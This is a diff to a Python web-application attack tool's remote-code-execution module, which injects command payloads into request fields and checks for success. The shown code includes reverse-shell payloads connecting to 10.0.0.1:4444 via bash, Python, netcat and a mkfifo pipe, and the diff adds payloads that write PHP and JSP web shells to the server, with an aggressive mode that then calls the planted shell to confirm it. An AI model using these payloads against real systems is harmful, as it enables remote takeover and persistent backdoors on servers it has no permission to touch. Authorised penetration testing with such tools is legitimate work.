@@ -8,16 +8,13 @@ def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
     baseline = client.send(scenario.method, scenario.target, json_body={"ip": "127.0.0.1"})
 
     if baseline.status_code in [404, 405]:
-        if scenario.config.get("aggressive"):
-            print(f"    [AGGRESSIVE] FORCE-ATTACK: Ignoring status {baseline.status_code}. Injecting RCE payloads...")
-        else:
-            return {
-                "scenario_id": scenario.id,
-                "attack_type": "rce",
-                "passed": True, 
-                "skipped": True,
-                "details": f"Endpoint returned {baseline.status_code}. Skipping attack."
-            }
+        return {
+            "scenario_id": scenario.id,
+            "attack_type": "rce",
+            "passed": True, 
+            "skipped": True,
+            "details": f"Endpoint returned {baseline.status_code}. Skipping attack."
+        }
     
     payloads = [
         # OS Command Injection (Unix)
@@ -61,7 +58,15 @@ def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
             "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
             "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
             "; nc -e /bin/sh 10.0.0.1 4444",
-            "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f"
+            "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
+            
+            # --- PERSISTENCE: WEB SHELLS ---
+            # Try to write a shell to the current directory
+            "; echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
+            "| echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
+            "& echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
+            "; echo '<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>' > shell.jsp",
+            "| echo '<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>' > shell.jsp"
         ])
     fields = scenario.config.get("fields", ["ip", "host", "command"])
     issues = []
@@ -82,7 +87,10 @@ def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
                 body = {"ip": "127.0.0.1"} 
                 body[field] = f"127.0.0.1 {p}" 
             
-            resp = client.send(scenario.method, scenario.target, json_body=body)
+            try:
+                resp = client.send(scenario.method, scenario.target, json_body=body)
+            except Exception:
+                continue
 
             suspicious = False
             reasons = []
@@ -108,15 +116,41 @@ def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
                 suspicious = True
                 reasons.append("Node.js Deserialization RCE Executed")
                 leaked_data.append("Node RCE Confirmed: Code executed.")
+
+            # PERSISTENCE CHECK: Did we write 'shell.php'?
+            if scenario.config.get("aggressive") and not suspicious:
+                try:
+                    # Construct potential shell URL. Assuming current dir based on target URL.
+                    # This is naive but works for simple cases.
+                    base = scenario.target.rsplit('/', 1)[0]
+                    if base == "": base = "/" # root
+                    
+                    # Check PHP
+                    shell_url = f"{base}/shell.php?cmd=echo%20BP_RCE_CONFIRMED"
+                    check_shell = client.send("GET", shell_url)
+                    if "BP_RCE_CONFIRMED" in check_shell.text:
+                         suspicious = True
+                         reasons.append(f"Web Shell Persisted at {shell_url}")
+                         leaked_data.append(f"[+] WEB SHELL ACTIVE: {shell_url}")
+                    
+                    # Check JSP
+                    shell_url_jsp = f"{base}/shell.jsp?cmd=echo%20BP_RCE_CONFIRMED"
+                    check_shell_jsp = client.send("GET", shell_url_jsp)
+                    if "BP_RCE_CONFIRMED" in check_shell_jsp.text:
+                         suspicious = True
+                         reasons.append(f"Web Shell Persisted at {shell_url_jsp}")
+                         leaked_data.append(f"[+] WEB SHELL ACTIVE: {shell_url_jsp}")
+
+                except: pass
             
             # 3. Crash / Exhaustion Detection
-            # If status is 0 (Network Error) or 503/504, or time > 4.5s (implies loop worked)
-            if resp.status_code in [0, 503, 504] or resp.elapsed_ms > 4500:
-                # Confirm it wasn't a fluke - if baseline was fast and this is slow
-                # Baseline is usually fast.
+            # User feedback: "Breakpoint misclassified self-failure as target failure." 
+            # Status 0 (Connection Error) usually means OUR proxy died, not the server.
+            # We only count it as DoS if it TIMED OUT (elapsed > 4.5s) significantly compared to baseline.
+            if resp.elapsed_ms > 4500:
                 if baseline.elapsed_ms < 1000:
                      suspicious = True
-                     reasons.append(f"Server Crash/Hang Confirmed (DoS via RCE). Status: {resp.status_code}, Time: {resp.elapsed_ms:.0f}ms")
+                     reasons.append(f"Server Hang Confirmed (DoS via RCE). Time: {resp.elapsed_ms:.0f}ms")
                 
             if suspicious:
                 issues.append(f"[CRITICAL] RCE Probability in '{field}': {', '.join(reasons)}")
